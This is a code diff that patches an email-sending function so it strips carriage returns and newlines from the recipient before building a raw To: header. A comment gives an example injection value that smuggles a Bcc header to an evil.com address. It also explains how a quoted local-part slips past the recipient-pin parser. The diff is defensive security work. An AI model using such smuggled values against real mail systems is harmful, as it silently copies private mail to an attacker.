@@ -1643,9 +1643,23 @@ ${plainTextToParagraphs(p.body)}
   const subject = p.subject
   const encodedSubject = `=?utf-8?B?${Buffer.from(subject).toString("base64")}?=`
   const boundary = `boundary_${Date.now()}`
+  // ⛔ STRIP CR/LF FROM THE RECIPIENT BEFORE IT ENTERS A RAW HEADER.
+  //
+  // A newline in `to` ends the To: line and starts a new header, so a value like
+  // `client@x.com\r\nBcc: "a"@evil.com` becomes a REAL blind copy. The recipient
+  // pin is not a defence against it: the pin's address parser excludes quote
+  // characters, so a quoted local-part smuggled onto a second line is invisible to
+  // the parser while the mail server honours it. Verified against the live parser —
+  // the plain form is caught, the quoted form passes.
+  //
+  // The prepared/attachment send path has always stripped this and calls it
+  // "belt-and-braces against header injection"; this path — the ordinary text email,
+  // the far more common one — never got the same treatment. Subject is base64 so it
+  // was never exposed the same way.
+  const toHeader = String(p.to ?? '').replace(/[\r\n]+/g, ' ').trim()
   const headers = [
     `From: ${sender.name} <${sender.email}>`,
-    `To: ${p.to}`,
+    `To: ${toHeader}`,
     `Subject: ${encodedSubject}`,
   ]
   if (inReplyTo) headers.push(`In-Reply-To: ${inReplyTo}`)
